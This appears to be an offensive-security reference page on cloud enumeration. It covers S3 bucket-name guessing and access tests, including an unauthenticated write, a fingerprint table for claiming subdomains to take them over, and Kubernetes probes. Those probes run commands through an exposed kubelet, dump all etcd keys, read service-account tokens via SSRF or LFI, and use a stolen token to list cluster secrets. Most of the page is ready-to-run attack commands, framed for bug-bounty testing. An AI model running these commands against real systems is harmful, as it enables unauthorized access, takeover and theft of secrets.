# Cloud-Specific Enumeration Techniques

## AWS S3 Bucket Enumeration

### Naming Pattern Generation
For target company "Acme Corp":
```bash
# Direct variations
acme, acmecorp, acme-corp, acme_corp

# With common suffixes
acme-assets, acme-uploads, acme-data, acme-media
acme-backup, acme-backups, acme-logs, acme-exports
acme-static, acme-public, acme-private
acme-dev, acme-staging, acme-production, acme-prod

# With common prefixes  
assets-acme, static-acme, public-acme, private-acme

# With environment
acme.dev, acme.staging, acme.prod
dev-acme, staging-acme, prod-acme

# User-generated content patterns
acme-user-uploads, acme-user-content, acme-user-data
acme-documents, acme-files, acme-images, acme-videos

# Internal patterns
acme-internal, acme-private, acme-admin
acme-ci, acme-deploy, acme-build
```

### Automated Tools
```bash
# lazys3 - brute-forces bucket names
./lazys3 acme

# S3Scanner
s3scanner scan --bucket-file candidates.txt

# aws-s3-enum
aws-s3-enum -w candidates.txt
```

### Access Testing Levels

**Level 1: Bucket exists**
```bash
curl -I https://acme-assets.s3.amazonaws.com/
# 403 = exists but private
# 404 = doesn't exist  
# 200 = exists and listable!
```

**Level 2: Listable**
```bash
curl https://acme-assets.s3.amazonaws.com/
# Returns XML with <Contents> = listable
```

**Level 3: Readable files**
```bash
# If listable, pick a file
curl https://acme-assets.s3.amazonaws.com/some-file.txt
```

**Level 4: Writable (PoC only)**
```bash
curl -X PUT -d "poc" https://acme-assets.s3.amazonaws.com/bugbounty-poc.txt
```

**Level 5: Authenticated access**
```bash
# Many buckets block anonymous but allow ALL AWS users
aws s3 ls s3://acme-assets/ --no-sign-request
aws s3 ls s3://acme-assets/  # with your AWS creds
```

## Subdomain Takeover Service Detection

| Service | CNAME Pattern | Error Response | Claim Method |
|---------|---------------|---------------|--------------|
| GitHub Pages | `*.github.io` | "There isn't a GitHub Pages site here" | Create repo with CNAME file |
| Heroku | `*.herokuapp.com` | "No such app" | Create Heroku app with that name |
| AWS S3 | `*.s3.amazonaws.com` | "The specified bucket does not exist" | Register bucket |
| AWS Elastic Beanstalk | `*.elasticbeanstalk.com` | Various | Register environment |
| Azure Websites | `*.azurewebsites.net` | NXDOMAIN | Register App Service |
| Azure Traffic Manager | `*.trafficmanager.net` | NXDOMAIN | Create Traffic Manager |
| Fastly | `*.fastly.net` | "Fastly error: unknown domain" | Register with Fastly |
| Shopify | `shops.myshopify.com` | "Sorry, this shop is currently unavailable" | Register shop |
| Tumblr | `*.tumblr.com` | "There's nothing here" | Register blog |
| WordPress.com | `*.wordpress.com` | "Do you want to register..." | Register blog |
| Ghost.io | `*.ghost.io` | "Domain error" | Register Ghost blog |
| Zendesk | `*.zendesk.com` | "Help Center Closed" | Register Zendesk |
| Readme.io | `*.readme.io` | "Project doesnt exist" | Register project |
| Surge.sh | `*.surge.sh` | "project not found" | Deploy with surge |
| Bitbucket | `*.bitbucket.io` | "Repository not found" | Create repo |

### Automated Detection
```bash
# Subzy
subzy run --targets subdomains.txt

# Subjack
subjack -w subdomains.txt -t 50 -timeout 30 -ssl -c fingerprints.json

# Nuclei takeover templates
nuclei -l subdomains.txt -t http/takeovers/
```

## Kubernetes Enumeration

### Exposed Kubernetes API
```bash
# Check common ports
curl -k https://target.com:10250/              # Kubelet API
curl -k https://target.com:8443/api/v1/        # Kubernetes API
curl -k https://target.com:2379/               # etcd
curl -k https://target.com:2375/               # Docker API (unauth)
```

### Kubelet API (Port 10250) — Often Exposed
```bash
# List pods
curl -k https://target.com:10250/pods

# Execute in pod (if auth disabled)
curl -k https://target.com:10250/exec/default/POD_NAME/CONTAINER_NAME?command=id
```

### etcd (Port 2379) — Critical If Exposed
```bash
# etcd stores ALL cluster secrets in plaintext
curl -k https://target.com:2379/v2/keys/?recursive=true
```

### Service Account Token Exposure
If SSRF or LFI → read the service account token:
```
file:///var/run/secrets/kubernetes.io/serviceaccount/token
file:///var/run/secrets/kubernetes.io/serviceaccount/namespace
```

Use the token:
```bash
curl -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/secrets
```

## Cloud Metadata Enumeration (via SSRF)

See [[ssrf/cloud_metadata.md]] for full details.
